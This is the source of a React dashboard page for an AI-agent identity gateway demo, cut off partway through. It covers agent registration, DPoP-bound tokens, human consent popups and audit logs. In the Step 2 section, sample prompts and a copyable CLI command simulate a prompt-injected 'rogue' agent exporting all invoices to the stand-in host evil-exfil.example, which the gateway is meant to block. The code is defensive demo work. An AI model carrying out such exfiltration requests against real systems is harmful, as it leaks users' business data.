"use client";

import React, { useState, useEffect } from "react";
import AuthScreen, {
  AuthenticatedUser,
  AuthenticatedOrg,
} from "../components/AuthScreen";
import { GO_API_BASE } from "../lib/api";
import { PhonePrompt, TelemetryEvent } from "../lib/types";
import {
  Shield,
  Building2,
  Bot,
  CheckCircle2,
  XCircle,
  BellRing,
  LogOut,
  RotateCcw,
  Terminal,
  Sparkles,
  Copy,
  Check,
  ShieldAlert,
  ShieldCheck,
  KeyRound,
  UserCheck,
  ArrowRight,
  Globe,
} from "lucide-react";

interface RegisteredAgentItem {
  agent_id: string;
  name?: string;
  owner_user: string;
  parent_agent_id?: string;
  spiffe_id: string;
  model_id: string;
  allowed_scopes?: string[];
  dpop_thumbprint: string;
  registered_at: number;
  status: string;
}

interface AuditEntry {
  id: string;
  timestamp: string;
  actor_user: string;
  agent_id: string;
  parent_agent?: string;
  event_type: string;
  method?: string;
  resource: string;
  target_host?: string;
  risk_score: number;
  verdict: string;
  policy_rule?: string;
  dpop_jkt?: string;
  token_jti?: string;
  family_id?: string;
  latency_us: number;
}

export default function HomePage() {
  const [currentUser, setCurrentUser] = useState<AuthenticatedUser | null>(
    null
  );
  const [activeOrg, setActiveOrg] = useState<AuthenticatedOrg | null>(null);
  const [activeStepTab, setActiveStepTab] = useState<1 | 2 | 3 | 4>(1);

  // Live state from Go server (:8080)
  const [agents, setAgents] = useState<RegisteredAgentItem[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditEntry[]>([]);
  const [latestEvent, setLatestEvent] = useState<TelemetryEvent | null>(null);
  const [globalPrompt, setGlobalPrompt] = useState<PhonePrompt | null>(null);
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);

  // Flow toggles (Step 1)
  const [flows, setFlows] = useState({
    dcr: true,
    camd: true,
    crm: true,
    dpop: true,
    egress: true,
    ciba: true,
  });

  // Step 2: Connect Agent inputs
  const [connectMode, setConnectMode] = useState<
    "api_key" | "terminal_cli" | "mcp_config" | "dcr_camd"
  >("api_key");
  const [llmProvider, setLlmProvider] = useState<"gemini" | "claude">("gemini");
  const [llmApiKey, setLlmApiKey] = useState("");
  const [llmModel, setLlmModel] = useState("gemini-2.5-flash");
  const [llmPrompt, setLlmPrompt] = useState(
    "Read our Q3 customer CRM records and summarize the invoices"
  );
  const [llmStatus, setLlmStatus] = useState<string | null>(null);

  // Zero-touch DCR / CAMD manual test inputs
  const [dcrName, setDcrName] = useState("Salesforce CRM Assistant");
  const [camdUrl, setCamdUrl] = useState(
    "https://crm-agent.acme.in/.well-known/oauth-client-metadata.json"
  );

  // Step 4: Inspector view toggle
  const [inspectorMode, setInspectorMode] = useState<"hierarchy" | "raw_jwt">(
    "hierarchy"
  );

  async function refreshServerState() {
    try {
      const [agRes, logRes] = await Promise.all([
        fetch(`${GO_API_BASE}/api/v1/agents`, {
          signal: AbortSignal.timeout(1500),
        }),
        fetch(`${GO_API_BASE}/api/v1/audit-logs`, {
          signal: AbortSignal.timeout(1500),
        }),
      ]);
      if (agRes.ok) {
        const agData = await agRes.json();
        if (Array.isArray(agData)) setAgents(agData);
      }
      if (logRes.ok) {
        const logData = await logRes.json();
        if (Array.isArray(logData)) setAuditLogs(logData);
      }
    } catch {
      // ignore offline
    }
  }

  useEffect(() => {
    const saved = localStorage.getItem("agent_identity_session");
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed.user && parsed.org) {
          setCurrentUser(parsed.user);
          setActiveOrg(parsed.org);
        }
      } catch {
        // ignore
      }
    }
  }, []);

  useEffect(() => {
    if (!currentUser) return;
    refreshServerState();

    let es: EventSource | null = null;
    try {
      es = new EventSource(`${GO_API_BASE}/api/v1/events/stream`);
      es.onmessage = (msg) => {
        try {
          const ev: TelemetryEvent = JSON.parse(msg.data);
          setLatestEvent(ev);
          refreshServerState();
          if (ev.phone_prompt) {
            if (ev.phone_prompt.type === "dismiss") {
              setGlobalPrompt(null);
            } else {
              setGlobalPrompt(ev.phone_prompt);
            }
          }
        } catch {
          // ignore
        }
      };
    } catch {
      // ignore
    }

    return () => {
      if (es) es.close();
    };
  }, [currentUser]);

  async function handleApproveConsent(consentId: string) {
    setGlobalPrompt(null);
    await fetch(`${GO_API_BASE}/api/v1/oauth/consent`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        consent_id: consentId,
        actions: globalPrompt?.requested_actions || ["read"],
      }),
    });
    refreshServerState();
    setActiveStepTab(4);
  }

  async function handleDenyConsent(consentId: string) {
    setGlobalPrompt(null);
    await fetch(`${GO_API_BASE}/api/v1/consents/revoke`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ consent_id: consentId }),
    });
    refreshServerState();
  }

  async function handleResolveCiba(authReqId: string, approved: boolean) {
    setGlobalPrompt(null);
    await fetch(`${GO_API_BASE}/api/v1/oauth/ciba-resolve`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ auth_req_id: authReqId, approved }),
    });
    refreshServerState();
    setActiveStepTab(4);
  }

  async function handleRunLiveLLM(e: React.FormEvent) {
    e.preventDefault();
    setLlmStatus(
      `Calling real ${llmProvider.toUpperCase()} (${llmModel})... Watch for the Step 3 Consent Popup!`
    );
    try {
      const res = await fetch(`${GO_API_BASE}/api/v1/live-llm/run`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          provider: llmProvider,
          api_key: llmApiKey,
          model: llmModel,
          user_email: currentUser?.email || "ajay@deltawavex.in",
          prompt: llmPrompt,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setLlmStatus("❌ " + (data.error || "API call failed"));
        return;
      }
      setLlmStatus("✅ " + data.message);
      refreshServerState();
    } catch {
      setLlmStatus("❌ Cannot reach Go server at http://localhost:8080");
    }
  }

  async function handleQuickDCR() {
    await fetch(`${GO_API_BASE}/oauth/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        client_name: dcrName,
        owner_user: "user:" + (currentUser?.email || "ajay@deltawavex.in"),
        model_id: "gemini-2.5-flash",
        scope: "crm.read invoices.read",
      }),
    });
    refreshServerState();
  }

  async function handleQuickCAMD() {
    await fetch(`${GO_API_BASE}/oauth/cimd-discover`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        metadata_url: camdUrl,
        owner_user: "user:" + (currentUser?.email || "ajay@deltawavex.in"),
        crm_target: "Enterprise CRM Flow",
      }),
    });
    refreshServerState();
  }

  async function handleRevokeAgent(agentId: string) {
    await fetch(`${GO_API_BASE}/api/v1/agents/revoke`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        agent_id: agentId,
        reason: "Revoked by Organization Owner",
      }),
    });
    refreshServerState();
  }

  async function handleResetWorkspace() {
    await fetch(`${GO_API_BASE}/api/v1/workspace/reset`, { method: "POST" });
    setAgents([]);
    setAuditLogs([]);
    setLatestEvent(null);
    setGlobalPrompt(null);
    setLlmStatus(null);
  }

  function copyText(id: string, text: string) {
    navigator.clipboard.writeText(text);
    setCopiedCmd(id);
    setTimeout(() => setCopiedCmd(null), 1500);
  }

  // If not logged in, show the clean Login / Create Organization screen
  if (!currentUser || !activeOrg) {
    return (
      <AuthScreen
        onSuccess={(user, org, token) => {
          setCurrentUser(user);
          setActiveOrg(org);
          localStorage.setItem(
            "agent_identity_session",
            JSON.stringify({ user, org, token })
          );
        }}
      />
    );
  }

  const cliCommand = `cd /Users/ajaykumarpagidipally/Documents/agentic_identity/agent-identity-backend && go run ./cmd/my-agent --user="${currentUser.email}" --agent="My Claude / Gemini Agent" --model="claude-opus-4.7"`;
  const cliBlockCommand = `cd /Users/ajaykumarpagidipally/Documents/agentic_identity/agent-identity-backend && go run ./cmd/my-agent --user="${currentUser.email}" --agent="Rogue Exfil Agent" --host="evil-exfil.example" --action="export_all"`;
  const mcpAddCommand = `claude mcp add agent-identity-gateway -- /Users/ajaykumarpagidipally/Documents/agentic_identity/agent-identity-backend/mcp-gateway --user="${currentUser.email}"`;

  // Build simple user -> agent hierarchy JSON from the most recent event or registered agent
  const activeClaims = latestEvent?.token_claims;
  const latestAgent = agents[0];
  const userAgentHierarchy = activeClaims?.user_agent_hierarchy || {
    user: {
      id: `user:${currentUser.email}`,
      role: currentUser.role,
      organization: activeOrg.name,
      agent: latestAgent
        ? {
            id: latestAgent.agent_id,
            name: latestAgent.name,
            scope:
              latestAgent.allowed_scopes?.join(", ") ||
              "/crm/customers:read (crm.read)",
            authorised:
              latestAgent.status === "ACTIVE" ? "yes" : "no (revoked)",
            token: activeClaims?.jti || "awaiting_token_exchange",
            time: activeClaims
              ? `ttl=${activeClaims.exp - activeClaims.iat}s`
              : "5m short-lived pass",
            type_of_agent: latestAgent.parent_agent_id ? "child" : "parent",
            awake: `${latestAgent.model_id} (awakened by ${currentUser.email})`,
            reason: latestEvent?.risk_decision?.top_reasons || [
              "spiffe_workload_attested",
              "dpop_key_bound",
            ],
            authorised_flow: "oauth2.1 + rfc7591_dcr + rfc9396_rar + rfc9449_dpop",
            dpop_cnf_jkt: latestAgent.dpop_thumbprint,
          }
        : "No agent connected yet — go to Step 2 to connect Claude or Gemini",
    },
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC] text-slate-900 flex flex-col">
      {/* =====================================================================
          LIVE STEP 3 CONSENT / CIBA POPUP MODAL (Pops up automatically whenever
          your terminal / Claude / Gemini agent requests a tool call!)
          ===================================================================== */}
      {globalPrompt && globalPrompt.type !== "dismiss" && (
        <div className="fixed inset-0 z-50 bg-slate-950/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="w-full max-w-md rounded-2xl border-2 border-blue-600 bg-white p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between">
              <span className="inline-flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider text-blue-600">
                <BellRing className="w-4 h-4 animate-bounce" />
                Step 3 · Live Agent Consent Request
              </span>
              <span className="font-mono text-xs bg-emerald-50 text-emerald-700 px-2.5 py-0.5 rounded-full border border-emerald-200 font-semibold">
                Risk Score: {globalPrompt.risk_score?.toFixed(2) || "0.12"}
              </span>
            </div>

            <div>
              <h3 className="text-lg font-bold text-slate-900">
                Approve pass for{" "}
                <code className="text-blue-600">{globalPrompt.agent_id}</code>?
              </h3>
              <p className="text-xs text-slate-500 mt-0.5">
                Acting on behalf of <b>{currentUser.email}</b> in organization{" "}
                <b>{activeOrg.name}</b>
              </p>
            </div>

            <div className="rounded-xl bg-slate-50 border border-slate-200 p-4 text-xs space-y-2">
              <div>
                <span className="text-slate-500">Task requested:</span>{" "}
                <b className="text-slate-900">
                  {globalPrompt.task_description}
                </b>
              </div>
              <div>
                <span className="text-slate-500">Folder / Resource Scope:</span>{" "}
                <code className="text-emerald-700 bg-emerald-50 px-1.5 py-0.5 rounded font-mono">
                  {globalPrompt.requested_resource}
                </code>
              </div>
              <div>
                <span className="text-slate-500">Allowed Action:</span>{" "}
                <code className="text-blue-700 bg-blue-50 px-1.5 py-0.5 rounded font-mono">
                  {globalPrompt.requested_actions?.join(", ") || "read"}
                </code>
              </div>
              <div>
                <span className="text-slate-500">Pass Lifetime:</span>{" "}
                <span className="text-slate-800 font-medium">
                  5 minutes (Bound to Agent&apos;s ES256 DPoP Private Key)
                </span>
              </div>
            </div>

            {globalPrompt.type === "rar_consent" ? (
              <div className="grid grid-cols-2 gap-3 pt-1">
                <button
                  onClick={() =>
                    handleDenyConsent(globalPrompt.prompt_id || "")
                  }
                  className="py-2.5 px-4 rounded-xl border border-rose-300 bg-rose-50 hover:bg-rose-100 text-rose-700 font-bold text-xs flex items-center justify-center gap-1.5"
                >
                  <XCircle className="w-4 h-4" />
                  Deny
                </button>
                <button
                  onClick={() =>
                    handleApproveConsent(globalPrompt.prompt_id || "")
                  }
                  className="py-2.5 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs flex items-center justify-center gap-1.5 shadow-lg shadow-emerald-600/20"
                >
                  <CheckCircle2 className="w-4 h-4" />
                  Approve Pass
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-2 gap-3 pt-1">
                <button
                  onClick={() =>
                    handleResolveCiba(globalPrompt.prompt_id || "", false)
                  }
                  className="py-2.5 px-4 rounded-xl bg-rose-600 hover:bg-rose-700 text-white font-bold text-xs flex items-center justify-center gap-1.5"
                >
                  <XCircle className="w-4 h-4" />
                  Deny &amp; Revoke
                </button>
                <button
                  onClick={() =>
                    handleResolveCiba(globalPrompt.prompt_id || "", true)
                  }
                  className="py-2.5 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-4 h-4" />
                  Approve Step-Up
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* =====================================================================
          TOP HEADER BAR (Clean Organization & User Status)
          ===================================================================== */}
      <header className="bg-white border-b border-slate-200 px-6 py-3.5 sticky top-0 z-30">
        <div className="max-w-5xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-blue-600 flex items-center justify-center text-white shadow-sm">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-base text-slate-900">
                  Agent Identity
                </span>
                <span className="text-xs px-2 py-0.5 rounded-md bg-slate-100 text-slate-700 font-semibold inline-flex items-center gap-1">
                  <Building2 className="w-3 h-3 text-blue-600" />
                  {activeOrg.name}
                </span>
                <span className="text-[11px] font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">
                  ● Server Live (:8080)
                </span>
              </div>
              <p className="text-xs text-slate-500">
                Logged in as <b>{currentUser.email}</b> · Active Agents:{" "}
                <b className="text-blue-600">{agents.length}</b>
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleResetWorkspace}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-600 text-xs font-medium"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              Reset (0 Agents)
            </button>
            <button
              onClick={() => {
                localStorage.removeItem("agent_identity_session");
                setCurrentUser(null);
                setActiveOrg(null);
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-rose-200 bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-medium"
            >
              <LogOut className="w-3.5 h-3.5" />
              Sign Out
            </button>
          </div>
        </div>
      </header>

      {/* =====================================================================
          SIMPLE 4-STEP HORIZONTAL STEPPER
          ===================================================================== */}
      <div className="bg-white border-b border-slate-200 px-6 py-4">
        <div className="max-w-5xl mx-auto grid grid-cols-1 sm:grid-cols-4 gap-2.5">
          {[
            {
              step: 1 as const,
              title: "Step 1 · Organization Flows",
              sub: "Enable DCR, CAMD, CRM & DPoP",
            },
            {
              step: 2 as const,
              title: "Step 2 · Connect Your Agent",
              sub: "Hook up real Claude, Gemini or CLI",
            },
            {
              step: 3 as const,
              title: `Step 3 · Agents & Consent (${agents.length})`,
              sub: "Approve passes & manage agents",
            },
            {
              step: 4 as const,
              title: `Step 4 · Live Gateway Activity (${auditLogs.length})`,
              sub: "See user → agent JSON & blocks",
            },
          ].map((item) => {
            const active = activeStepTab === item.step;
            return (
              <button
                key={item.step}
                onClick={() => setActiveStepTab(item.step)}
                className={`text-left p-3 rounded-xl border transition flex items-center justify-between ${
                  active
                    ? "border-blue-600 bg-blue-50/70 shadow-sm"
                    : "border-slate-200 bg-white hover:bg-slate-50"
                }`}
              >
                <div>
                  <div
                    className={`text-xs font-bold ${
                      active ? "text-blue-700" : "text-slate-800"
                    }`}
                  >
                    {item.title}
                  </div>
                  <div className="text-[11px] text-slate-500 mt-0.5">
                    {item.sub}
                  </div>
                </div>
                <ArrowRight
                  className={`w-4 h-4 shrink-0 ${
                    active ? "text-blue-600" : "text-slate-300"
                  }`}
                />
              </button>
            );
          })}
        </div>
      </div>

      {/* =====================================================================
          STEP CONTENT AREA (One Clean, Focused Screen at a Time)
          ===================================================================== */}
      <main className="flex-1 max-w-5xl w-full mx-auto px-6 py-8">
        {/* -------------------------------------------------------------------
            STEP 1: ORGANIZATION FLOWS (Clean 2-Column Cards like Screenshot)
            ------------------------------------------------------------------- */}
        {activeStepTab === 1 && (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-xl font-bold text-slate-900">
                  Step 1 · Configure Organization Flows &amp; Attack Protection
                </h1>
                <p className="text-xs text-slate-500 mt-1">
                  Choose which zero-touch onboarding flows (DCR, CAMD, CRM) and
                  runtime guardrails are active for <b>{activeOrg.name}</b>.
                </p>
              </div>
              <button
                onClick={() => setActiveStepTab(2)}
                className="px-4 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold flex items-center gap-1.5 shadow-sm"
              >
                <span>Next: Step 2 (Connect Your Agent)</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {[
                {
                  key: "dcr" as const,
                  title: "Dynamic Client Registration (RFC 7591 DCR)",
                  desc: "Agents register automatically at runtime without manual admin setup.",
                  badge: "RFC 7591 · POST /oauth/register",
                },
                {
                  key: "camd" as const,
                  title: "CAMD / CIMD Metadata Auto-Discovery",
                  desc: "Zero-touch agent onboarding by fetching the agent's HTTPS Client Metadata Document URL.",
                  badge: "IETF CIMD · POST /oauth/cimd-discover",
                },
                {
                  key: "crm" as const,
                  title: "CRM & Enterprise Tool Delegation Flow",
                  desc: "Protect customer CRM & invoice endpoints with task-scoped RFC 9396 RAR user consent.",
                  badge: "RAR + RFC 8693 Sub-Agent Exchange",
                },
                {
                  key: "dpop" as const,
                  title: "DPoP Stolen-Token Replay Protection",
                  desc: "Bind every token to the agent's in-memory ES256 private key (cnf.jkt) so stolen tokens fail.",
                  badge: "RFC 9449 Sender-Constrained",
                },
                {
                  key: "egress" as const,
                  title: "Default-Deny Egress Domain Guard",
                  desc: "Block prompt-injected agents from sending data to unknown external domains (e.g. evil-exfil.example).",
                  badge: "Layer 2 Inline Egress Proxy",
                },
                {
                  key: "ciba" as const,
                  title: "Risk-Based Human Step-Up (OpenID CIBA)",
                  desc: "Ask the human user for live approval when an agent attempts a high-risk action or payment.",
                  badge: "Layer 3 Risk Engine + CIBA",
                },
              ].map((card) => {
                const enabled = flows[card.key];
                return (
                  <div
                    key={card.key}
                    className="rounded-xl border border-slate-200 bg-white p-5 shadow-sm flex flex-col justify-between gap-4"
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div>
                        <h3 className="text-sm font-bold text-slate-900">
                          {card.title}
                        </h3>
                        <p className="text-xs text-slate-500 mt-1 leading-relaxed">
                          {card.desc}
                        </p>
                      </div>
                      <button
                        type="button"
                        onClick={() =>
                          setFlows((f) => ({ ...f, [card.key]: !f[card.key] }))
                        }
                        className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors ${
                          enabled ? "bg-emerald-600" : "bg-slate-200"
                        }`}
                      >
                        <span
                          className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition ${
                            enabled ? "translate-x-5" : "translate-x-0"
                          }`}
                        />
                      </button>
                    </div>
                    <div className="flex items-center justify-between pt-2 border-t border-slate-100">
                      <span
                        className={`font-mono text-[10px] font-bold uppercase px-2 py-0.5 rounded border ${
                          enabled
                            ? "bg-emerald-50 text-emerald-700 border-emerald-200"
                            : "bg-slate-100 text-slate-500 border-slate-200"
                        }`}
                      >
                        {enabled ? "ENABLED" : "DISABLED"}
                      </span>
                      <span className="font-mono text-[11px] text-slate-400">
                        {card.badge}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* -------------------------------------------------------------------
            STEP 2: CONNECT YOUR REAL CLAUDE / GEMINI / CLI AGENT
            ------------------------------------------------------------------- */}
        {activeStepTab === 2 && (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-xl font-bold text-slate-900">
                  Step 2 · Connect Your Real Gemini or Claude Agent
                </h1>
                <p className="text-xs text-slate-500 mt-1">
                  Pick how you want to connect your agent. When your agent runs,
                  the Go Gateway intercepts its tool call and pops up the live
                  consent screen right here!
                </p>
              </div>
              <button
                onClick={() => setActiveStepTab(3)}
                className="px-4 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold flex items-center gap-1.5 shadow-sm"
              >
                <span>Next: Step 3 (View Registered Agents)</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>

            {/* 4 Clean Connection Method Tabs */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              {[
                {
                  id: "api_key" as const,
                  label: "1. Paste Gemini / Claude API Key",
                },
                {
                  id: "terminal_cli" as const,
                  label: "2. Run Terminal Go Agent CLI",
                },
                {
                  id: "mcp_config" as const,
                  label: "3. Connect Claude / Gemini MCP",
                },
                {
                  id: "dcr_camd" as const,
                  label: "4. Test DCR / CAMD Auto-Register",
                },
              ].map((t) => (
                <button
                  key={t.id}
                  onClick={() => setConnectMode(t.id)}
                  className={`py-2.5 px-3 rounded-xl text-xs font-bold border transition ${
                    connectMode === t.id
                      ? "bg-blue-600 text-white border-blue-600 shadow-sm"
                      : "bg-white text-slate-700 border-slate-200 hover:bg-slate-50"
                  }`}
                >
                  {t.label}
                </button>
              ))}
            </div>

            {/* Method 1: Paste Real Gemini or Claude API Key */}
            {connectMode === "api_key" && (
              <form
                onSubmit={handleRunLiveLLM}
                className="rounded-2xl border border-slate-200 bg-white p-6 shadow-sm space-y-4"
              >
                <div className="flex items-center gap-2 text-blue-600">
                  <Sparkles className="w-5 h-5" />
                  <h3 className="text-base font-bold text-slate-900">
                    Connect Real Google Gemini or Anthropic Claude API With Our
                    Gateway in the Middle
                  </h3>
                </div>
                <p className="text-xs text-slate-500">
                  Enter your real API key and give the LLM a task. The real LLM
                  will decide which tool to call (
                  <code>read_q3_invoices</code>, <code>query_customer_crm</code>
                  , <code>initiate_vendor_payment</code>, or{" "}
                  <code>http_egress_export</code>), and our Go Gateway will
                  intercept it and ask for your consent!
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div>
                    <label className="block font-semibold text-slate-700 mb-1">
                      Select AI Provider
                    </label>
                    <select
                      value={llmProvider}
                      onChange={(e) => {
                        const p = e.target.value as "gemini" | "claude";
                        setLlmProvider(p);
                        setLlmModel(
                          p === "claude"
                            ? "claude-3-5-sonnet-latest"
                            : "gemini-2.5-flash"
                        );
                      }}
                      className="w-full rounded-xl border border-slate-300 px-3 py-2.5 text-slate-900 font-semibold"
                    >
                      <option value="gemini">
                        Google Gemini (gemini-2.5-flash)
                      </option>
                      <option value="claude">
                        Anthropic Claude (claude-3-5-sonnet-latest)
                      </option>
                    </select>
                  </div>

                  <div>
                    <label className="block font-semibold text-slate-700 mb-1">
                      Your Real {llmProvider === "gemini" ? "GEMINI_API_KEY" : "ANTHROPIC_API_KEY"}
                    </label>
                    <input
                      type="password"
                      required
                      value={llmApiKey}
                      onChange={(e) => setLlmApiKey(e.target.value)}
                      placeholder="Paste your API key here..."
                      className="w-full rounded-xl border border-slate-300 px-3 py-2.5 text-slate-900 font-mono"
                    />
                  </div>
                </div>

                <div className="text-xs">
                  <label className="block font-semibold text-slate-700 mb-1">
                    Task Prompt for the Agent
                  </label>
                  <input
                    value={llmPrompt}
                    onChange={(e) => setLlmPrompt(e.target.value)}
                    className="w-full rounded-xl border border-slate-300 px-3 py-2.5 text-slate-900"
                  />
                  <div className="flex flex-wrap gap-2 mt-2">
                    <button
                      type="button"
                      onClick={() =>
                        setLlmPrompt(
                          "Read our Q3 customer CRM records and summarize the invoices"
                        )
                      }
                      className="px-2.5 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-700 text-[11px] font-medium"
                    >
                      ✅ Normal Task: Read Q3 CRM &amp; Invoices
                    </button>
                    <button
                      type="button"
                      onClick={() =>
                        setLlmPrompt(
                          "Export all Q3 invoices to external host evil-exfil.example"
                        )
                      }
                      className="px-2.5 py-1 rounded-lg bg-rose-50 hover:bg-rose-100 text-rose-700 text-[11px] font-medium"
                    >
                      🛑 Attack Test: Exfiltrate to evil-exfil.example (Gateway
                      Blocks!)
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full py-3 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold shadow-md transition"
                >
                  Run Real {llmProvider === "gemini" ? "Gemini" : "Claude"} Agent
                  Through Go Gateway
                </button>

                {llmStatus && (
                  <div className="rounded-xl bg-blue-50 border border-blue-200 p-3 text-xs text-blue-800 font-medium">
                    {llmStatus}
                  </div>
                )}
              </form>
            )}

            {/* Method 2: Run Terminal Go Agent CLI (No API key needed!) */}
            {connectMode === "terminal_cli" && (
              <div className="rounded-2xl border border-slate-200 bg-white p-6 shadow-sm space-y-4">
                <div className="flex items-center gap-2 text-blue-600">
                  <Terminal className="w-5 h-5" />
                  <h3 className="text-base font-bold text-slate-900">
                    Run a Live Agent From Your Mac Terminal (Zero API Key Needed)
                  </h3>
                </div>
                <p className="text-xs text-slate-500">
                  Copy and run either command in your terminal. Watch the
                  consent popup appear immediately in this browser window!
                </p>

                <div className="space-y-3">
                  <div className="rounded-xl bg-slate-900 p-4 space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-emerald-400 font-semibold">
                        A. Legitimate Agent Run (Registers via DCR → Pops Up
                        Consent → Mints DPoP + Sub-Agent Token → Allowed)
                      </span>
                      <button
                        onClick={() => copyText("cli_ok", cliCommand)}
                        className="text-slate-300 hover:text-white flex items-center gap-1 text-[11px]"
                      >
                        {copiedCmd === "cli_ok" ? (
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                        Copy
                      </button>
                    </div>
                    <pre className="text-xs font-mono text-slate-100 overflow-x-auto select-all">
                      {cliCommand}
                    </pre>
                  </div>

                  <div className="rounded-xl bg-slate-900 p-4 space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-rose-400 font-semibold">
                        B. Rogue / Prompt-Injected Agent Run (Tries to export to
                        evil-exfil.example → Gateway Blocks &amp; Revokes Family!)
                      </span>
                      <button
                        onClick={() => copyText("cli_bad", cliBlockCommand)}
                        className="text-slate-300 hover:text-white flex items-center gap-1 text-[11px]"
                      >
                        {copiedCmd === "cli_bad" ? (
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                        Copy
                      </button>
                    </div>
                    <pre className="text-xs font-mono text-slate-100 overflow-x-auto select-all">
                      {cliBlockCommand}
                    </pre>
                  </div>
                </div>
              </div>
            )}

            {/* Method 3: Connect Claude Code / Claude Desktop / Gemini CLI via MCP */}
            {connectMode === "mcp_config" && (
              <div className="rounded-2xl border border-slate-200 bg-white p-6 shadow-sm space-y-4">
                <h3 className="text-base font-bold text-slate-900">
                  Put Our Go MCP Gateway Inside Real Claude Code, Claude
                  Desktop, or Gemini CLI
                </h3>
                <p className="text-xs text-slate-500">
                  We compiled a real stdio MCP server binary at{" "}
                  <code>agent-identity-backend/mcp-gateway</code>. Add it to
                  Claude Code with one command:
                </p>
                <div className="rounded-xl bg-slate-900 p-4 space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-blue-300 font-semibold">
                      Add MCP Gateway to Claude Code:
                    </span>
                    <button
                      onClick={() => copyText("mcp_cmd", mcpAddCommand)}
                      className="text-slate-300 hover:text-white flex items-center gap-1 text-[11px]"
                    >
                      {copiedCmd === "mcp_cmd" ? (
                        <Check className="w-3.5 h-3.5 text-emerald-400" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                      Copy
                    </button>
                  </div>
                  <pre className="text-xs font-mono text-emerald-300 overflow-x-auto select-all">
                    {mcpAddCommand}
                  </pre>
                </div>
                <p className="text-xs text-slate-600">
                  Then ask Claude: <i>&ldquo;Call read_q3_invoices&rdquo;</i> or{" "}
                  <i>
                    &ldquo;Call http_egress_fetch with target_host
                    evil-exfil.example&rdquo;
                  </i>
                  .
                </p>
              </div>
            )}

            {/* Method 4: One-Click DCR & CAMD Auto-Registration */}
            {connectMode === "dcr_camd" && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm space-y-3">
                  <h3 className="text-sm font-bold text-slate-900">
                    1. Dynamic Client Registration (RFC 7591 DCR)
                  </h3>
                  <p className="text-xs text-slate-500">
                    Simulates an agent calling <code>POST /oauth/register</code>{" "}
                    to onboard itself automatically:
                  </p>
                  <input
                    value={dcrName}
                    onChange={(e) => setDcrName(e.target.value)}
                    className="w-full rounded-xl border border-slate-300 px-3 py-2 text-xs"
                  />
                  <button
                    onClick={handleQuickDCR}
                    className="w-full py-2.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold"
                  >
                    + Auto-Register Agent via DCR
                  </button>
                </div>

                <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm space-y-3">
                  <h3 className="text-sm font-bold text-slate-900 flex items-center gap-1.5">
                    <Globe className="w-4 h-4 text-emerald-600" />
                    2. CAMD / CIMD Metadata URL Discovery
                  </h3>
                  <p className="text-xs text-slate-500">
                    Simulates an agent presenting its HTTPS metadata URL as its{" "}
                    <code>client_id</code>:
                  </p>
                  <input
                    value={camdUrl}
                    onChange={(e) => setCamdUrl(e.target.value)}
